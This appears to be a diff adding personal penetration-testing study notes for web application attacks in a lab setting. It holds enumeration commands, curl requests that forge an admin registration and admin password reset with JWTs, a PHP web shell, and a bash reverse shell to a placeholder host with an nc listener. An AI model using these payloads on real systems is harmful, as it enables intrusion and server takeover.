@@ -1,0 +1,75 @@
+Manual inspection (in the browser, view the source code, default credentials) ==>  file/directory fuzzing ==> robots.txt, .svn, .DS_STORE
+Finger printing
+sudo nmap -p80  -sV 192.168.50.20
+sudo nmap -p80 --script=http-enum 192.168.50.20
+{Wappalyzer} plug-in is a great tool for application stack enumeration.
+Directory Brute Forcing
+Look for robts.txt, .svn, .DS_STORE, .git
+Look at the source code
+(Enumerate API's)
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+(files)
+
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://website.com/FUZZ
+(directories)
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://website.com/FUZZ/
+* FUZZ is important to activate wfuzz
+
+ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://192.168.174.150:8080/FUZZ
+
+feroxbuster -u http://192.168.252.150:8080 -x pdf,js,html,php,txt,json,docx
+Local File Inclusion (LFI)
+Look at the separate page "File Inclusion Vulnerability"
+Burp Suite
+Don't forget to use {Burp Suite} where needed.
+Debugger tools
+Web browsers such as {Firefox} and {Chrome} have their own debugger tools. These can be used to view the page contents in more detail. 
+Don't forget to look at the page source for comments!!!
+(download robots.txt)
+curl https://www.google.com/robots.txt
+
+(further enumerate using curl)
+curl -i http://192.168.50.16:5002/users/v1
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+
+(Forging a POST request)
+curl  \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+  -d '{"password": "pwned"}'
+  
+(Forging a PUT request)
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+  
+(example using wpscan for wordpress)
+wpscan -url http://x.x.x.x/wordpress/ --enumerate p --plugins-detection aggressive
+if the payload don't work for some reason, then Transfer, Permit, and Execute
+PHP
+if you have access to phpinfo.php page, then always look for "Document Root" in the enumeration. 
+here are some examples of getting shell using php script. after the <?php, each of the lines does the same thing, so just use one of them.
+<?php
+
+echo "<pre>";
+passthru($_GET['cmd']);
+system($_GET['cmd']);
+shell_exec($_GET['cmd']);
+exec($_GET['cmd']);
+pOpen($_GET['cmd']);
+eval("passthru('cmd')");
+
+?>
+
+* if you get command back when you go to x.x.x.x:xxxx/uploaded_script.php?cmd=id, then swap id with reverse shell
+
+(victim)
+** don't forget to url encode the special characters
+bash -c 'bash -i >& /dev/tcp/x.x.x.x/9090 0>&1'
+
+(kali)
+nc -lvnp 9090
